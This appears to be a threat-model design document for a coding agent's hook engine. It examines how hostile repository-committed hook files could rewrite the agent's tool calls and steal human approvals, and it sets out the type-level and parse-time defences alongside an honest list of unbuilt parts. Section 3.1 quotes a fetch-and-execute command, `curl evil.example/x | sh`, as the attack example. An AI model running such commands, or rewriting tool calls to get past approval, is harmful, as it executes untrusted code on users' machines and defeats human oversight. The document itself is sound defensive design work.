# Threat model — Outcome 13: the hook engine

Written before the first line of code, per `.impl/BRIEF.md` rule 4.
Depends on the capability decision in `12-executable-skills.md` §0 — read that
first. Owner: agent-wasm.

---

## 1. What crosses the boundary

A **hook definition**: a `hook.toml` file (the shape of `docs/specs/hook.toml`)
declaring an event to bind to, a kind (`observe` / `validate` / `mutate`), a
priority, a runtime to execute, and a policy for what its failure means.

Where hook definitions come from is the whole problem:

| Origin | Trust | Who can write it |
|---|---|---|
| `<data_dir>/hooks/` (user scope) | operator-authored | the human running the daemon |
| `<repo>/.codypendent/hooks/` (**repository scope**) | **untrusted** | *anyone who can land a commit in a repository the user clones* |
| a plugin/skill package | **untrusted** | the package publisher |

`docs/specs/hook.toml` ships `scope = "repository"` in its own example. A
repository-scoped hook is therefore **attacker-controlled configuration that
executes on the user's machine and can see, and potentially alter, every tool
call the agent makes.** This is the highest-privilege untrusted input in the
product. It is strictly more dangerous than a skill package, because a skill is
invoked deliberately whereas a hook fires on someone else's action.

## 2. What the attacker controls

* Every field of `hook.toml`: `event`, `kind`, `priority`, `[runtime] program`
  and `args` and `working_directory` and `timeout_seconds`, `[policy] failure`
  and `requires_approval` and `network`, `[output] *`.
* The *number* of hooks (a directory of 10 000 of them).
* The `priority` ordering, including collisions and negative/extreme values.
* The bytes the hook process writes to stdout — which, for a `mutate` hook, is
  a **proposed rewrite of a tool call**, i.e. attacker-authored JSON that wants
  to become an action the agent performs.
* The hook's exit code, and whether it exits at all.
* Whether `hook.toml` is added *after* the user approved something earlier in
  the same session.

## 3. Why a hook cannot become a privilege-escalation path

This is the question the brief singles out, so it gets the longest answer.

### 3.1 The attack

The agent proposes `workspace.read_file{path: "README.md"}`. Policy says
`Allow` — reads inside the repo are cheap and ungated. A `mutate` hook bound to
`tool.pre` rewrites it to
`shell.run{program: "sh", args: ["-c", "curl evil.example/x | sh"]}`.
If the rewritten call inherits the original's decision, the attacker has turned
an auto-allowed read into an unapproved arbitrary-command execution. If the
rewrite happens *after* a human approved a different action, they have stolen
that human's approval.

### 3.2 The structural defences

Every one of these is enforced by code in `crates/sandbox/src/hook.rs` and has a
test. Defences that depend on a dispatcher, a registration flow, or an approval
UI are **not** here — they are in §4.2, marked as unbuilt. That separation is
the point: this section used to mix the two.

**(a) A rewrite is not an action. It is a proposal, and the type says so.**

The hook engine's mutate result is `Unapproved<ToolCall>`. It has private
fields, no `Deserialize`, no public constructor, and — critically — **no
accessor that yields the inner `ToolCall`**. The only way to get a `ToolCall`
out is:

```rust
impl Unapproved<ToolCall> {
    pub fn reenter<G: PolicyReentry>(self, gate: &G, ctx: &ReentryContext)
        -> Result<Authorized<ToolCall>, HookDenied>;
}
```

A caller that "forgets" to re-run policy on a rewritten call does not fail
open — it fails to compile. This is the same construction as
`GateGrant` (12 §0.5) and `PromotionRecord`, both of which the 2026-08-13
review found sound.

**(b) The prior decision is destroyed, not carried.**

`reenter` takes a `ReentryContext` that does **not** contain the original
`PolicyDecision`, the original `CapabilityGrant`, or any approval id. There is
no field to inherit from. The rewritten call is evaluated as if the agent had
just proposed it: same `PolicyEngine::evaluate`, same mode overlay, same
approval gate. An action that would have needed approval when proposed by the
model needs approval when proposed by a hook.

**(c) Approvals are bound to the action, so a stolen approval does not fit.**

An approval is keyed by a digest of the *action* it approved. A rewritten call
has a different digest, so an outstanding approval for the original cannot
satisfy it. This is a property the engine asserts rather than assumes:
`ReentryContext::approval_binding` carries the digest of the action a human
actually saw, and `reenter` refuses if the rewritten action's digest differs
and no fresh approval exists.

**(d) A hook can only ever narrow, never widen — by construction of the
combinator, not by convention.**

Hook results combine under a lattice where `Deny` is absorbing:

```
Deny  ⊓  anything          = Deny
Allow ⊓  Rewrite(a)        = Rewrite(a)     // still Unapproved, still re-entered
Rewrite(a) ⊓ Rewrite(b)    = Deny           // conflicting rewrites are refused
Observe  ⊓ x               = x              // observers cannot affect the verdict
```

Two hooks that both want to rewrite the same call produce `Deny`, not
"last-priority-wins". Ordering therefore cannot be gamed by priority: a
higher-priority hook cannot overwrite a lower one's rewrite to launder it, and
a hostile repo hook cannot cancel a user-scoped hook's `Deny`.

**(e) A hook cannot claim a scope it did not arrive in.**

`scope` decides which trust tier a hook inherits, and it was the one
security-relevant field parsed as a bare `String`: the 2026-08-13 review showed
`"system"`, `"organization"`, `"not-a-real-scope"` and `""` all parsing out of a
repository-committed file. Two things now hold, and both are needed:

* `HookScope` is a **closed enum** (`user | repository | organization |
  system`), matching `hooks.scope_kind` in migration 0027. An unknown or empty
  value is a parse error.
* `parse_hook(raw, discovered)` takes the scope from **whatever walked the
  directory** and refuses a declaration that disagrees
  (`HookError::ScopeMismatch`). Closing the set alone would still let a
  repository file claim `scope = "user"`; re-deriving from the discovery site
  is what makes the declaration non-authoritative. This is the rule
  `manifest::load_package` already applies to `skill.toml`.

**(f) `mutate` must declare that a human stays in the loop.**

`HookSpec::is_high_risk()` returns `true` for `mutate` — derived from
authority, never from the package's self-description. The review found it had
**zero callers**, so it was a label. It now decides something: `parse_hook`
refuses a `mutate` hook whose `[policy] requires_approval` is `false`. A hook
that can rewrite what the agent does cannot also declare that nobody need see
the result.

*What this does not do:* it does not map onto `RiskClass::High`. That enum
lives in `crates/knowledge`, which depends on `crates/sandbox` and not the
reverse, and minting a parallel risk enum here would be the "second vocabulary
that drifts" defect of 12 §0.2. The mapping belongs to whatever registers a
hook — which does not exist (§6).

**(g) `working_directory` placeholders are checked against a closed table.**

`HOOK_PLACEHOLDERS` is `{REPOSITORY, WORKTREE, HOME}` — the same names
`skill_exec::substitute_placeholders` resolves, with the same tokenizer rules —
and an unknown `$NAME` is a parse error. Previously a `$NOT_A_THING` was stored
verbatim, which is the skills defect (12 §7, 12.7(2)) repeated.

*What this does not do:* it does not substitute. The values are properties of a
run and the resolver lives in a crate that depends on this one, so the caller
substitutes. What is enforced here is that the caller will never meet a name its
own table lacks.

**(h) Hooks cannot register hooks.** There is no `hook.registered` event.

### 3.3 What is deliberately *not* claimed

A `validate` hook with `failure = "block"` can **stop** work. That is a
denial-of-service surface a hostile repository gets for free — it can make the
agent refuse to do anything. That is acceptable: refusing to act is the safe
direction, and it is loud (the user sees the blocking hook by name). A hook
cannot *cause* an action.

An `observe` hook sees tool-call metadata. If it also has an exfiltration
channel it can leak that metadata. With `network = "deny"` and no secret
brokering it has no channel except its own stdout, which is captured, capped,
sanitized, and attributed. Recorded as residual, not fixed.

## 4. Denied by default

Split honestly: what the code refuses today, and what is a requirement on the
dispatcher nobody has built. A requirement written as a mitigation is how §6
came to describe protections that do not exist.

### 4.1 Enforced now, in `crates/sandbox/src/hook.rs`, with tests

1. **No network**, per `[policy] network = "deny"`. `HookNetwork` is a
   one-variant enum, so `network = "allow"` in a hostile `hook.toml` is a parse
   error on this binary rather than a value accepted and ignored.
2. **Unknown fields are a parse error** (`deny_unknown_fields` throughout,
   mirroring `plugin.toml`/`skill.toml` discipline) — a future
   `[policy] escalate = true` cannot be silently ignored by an old binary.
3. **Unknown `event` / `kind` / `failure` / `scope` values are parse errors**,
   not defaults.
4. **A declared `scope` must equal the discovered scope** — §3.2(e).
5. **A `mutate` hook must declare `requires_approval = true`** — §3.2(f).
6. **A `mutate` hook may only bind to `tool.pre`**, the only point at which a
   rewrite can still be re-checked before anything happens.
7. **`failure = "block"` is refused on a post-hoc event**, which cannot prevent
   anything.
8. **`timeout_seconds = 0` is refused** rather than read as "unlimited".
9. **An unknown `working_directory` placeholder is a parse error** — §3.2(g).
10. **Bounded fan-out**: `MAX_HOOKS_PER_EVENT = 32`, refused at load
    (`validate_event_set`). A directory of 10 000 hooks is refused.
11. **Total, package-independent dispatch order**: `(priority, id)`, never
    filesystem enumeration order.
12. **A rewrite is not a tool call** — the `Unapproved`/`Authorized` wall,
    §3.2(a)–(d). `Unapproved` also has a hand-written `Debug` that redacts the
    value: the derived one printed the whole rewritten call, so "no accessor
    yields the inner `ToolCall`" had a `{:?}`-shaped hole in exactly the place
    (`tracing`) where it would be used.

### 4.2 NOT enforced — requirements on a dispatcher that does not exist

Previously written here as if enforced. Each was falsified by the 2026-08-13
review; each is now stated as work, not as a defence.

| Requirement | Status |
|---|---|
| No hook fires without a human-approved registration bound to its content hash; discovery ≠ activation | **Not built.** Nothing discovers, registers, or approves a hook. `HookSpec::content_digest` exists and has no caller. The `hooks` table (migration 0027) is written by no code. |
| A hook is registered as `RegistryItemKind::Hook` with `RegistryStatus::Draft` | **Not built.** The enum label has no producer. |
| A per-event total wall-clock budget, enforced | **Deleted as a claim.** Only the count ceiling (4.1.10) exists. There is no aggregate-budget type in the crate, and adding one with no dispatcher to call it would be another unenforced mitigation. |
| No recursion: the dispatcher carries a depth token; depth > 0 disables dispatch | **Deleted as a claim.** There is no dispatcher, so there is nothing to bound. Whoever builds it owns this. |
| A hook's own execution goes through the same `SandboxExecutor` + `RunPolicyGate` pair as a skill | **Not built.** `HookRuntime::Command` is parsed and never run. No hook process is spawned by anything. |
| `working_directory` placeholders *resolve* through the substitution table | **Half built.** The names are validated (4.1.9); substitution is the caller's, and there is no caller. |

The fail-closed direction is the safe one — a hook that cannot fire cannot
bypass an approval — so none of this is a live hole. It is an outcome that does
not exist, recorded as such.

## 5. Escapes I am explicitly NOT defending against

1. **A hook that legitimately runs `cargo test` runs arbitrary code.** `cargo`
   executes build scripts. If the operator's policy allows `cargo` and the user
   approves the hook, hostile code in the repository's own `build.rs` runs —
   but that was already true the moment the user asked the agent to build the
   repo. The hook does not widen it.
2. **Timing/ordering side channels between hooks.** Not modelled.
3. **A hostile *user-scope* hook.** User scope is operator-authored; if the
   operator's home directory is compromised, so is the daemon.
4. **Everything in 12 §6** (wasmi bugs, aggregate resource exhaustion,
   microarchitectural channels) applies identically here.

## 6. Honest status of this outcome

**A hook cannot fire. Not one of the three verbs — observe, validate, deny —
can be exercised on a real tool call.** The 2026-08-13 review planted a hostile
`mutate` hook at `<repo>/.codypendent/hooks/hook.toml`, booted the daemon in
that repository, and the `hooks` table stayed empty; nothing was discovered,
parsed, registered, approved, or run.

What exists, and what does not:

| Piece | State |
|---|---|
| `hook.toml` parser + validation (§4.1) | **Ships here, tested, adversarially.** |
| Verdict lattice (`combine`), `Deny` absorbing | **Ships here, tested.** Zero callers outside its own tests. |
| `Unapproved`/`Authorized` type wall + `reenter` | **Ships here, tested.** `PolicyReentry` is implemented by `crates/daemon/src/policy_gate.rs`, whose adapter has zero constructor calls anywhere. |
| Migration 0027 (`hooks`, `hook_dispatches`) | Tables created; **written by no code**. |
| Discovery of `.codypendent/hooks/` | **Does not exist.** `grep -rn "hook\.toml"` over `crates/` finds only doc comments. |
| Registration / approval flow | **Does not exist.** |
| Dispatch (emitting `tool.pre` and friends) | **Does not exist.** The seam is `crates/runtime/src/agent.rs`, which this agent does not own; it ships as a proposal. |
| Execution of a hook's `[runtime]` | **Does not exist.** |
| A `hook` CLI command or RPC | **Does not exist.** |

"No hook can fire" is the correct fail-closed state for a half-built engine, and
it is what the brief asks for over "a half-built hook engine that can bypass
approvals". The engine is built so that wiring it up cannot introduce the
escalation path, because the type a rewrite produces cannot be executed without
re-entering policy. But the outcome is **not delivered**, and this document is
not evidence that it is.
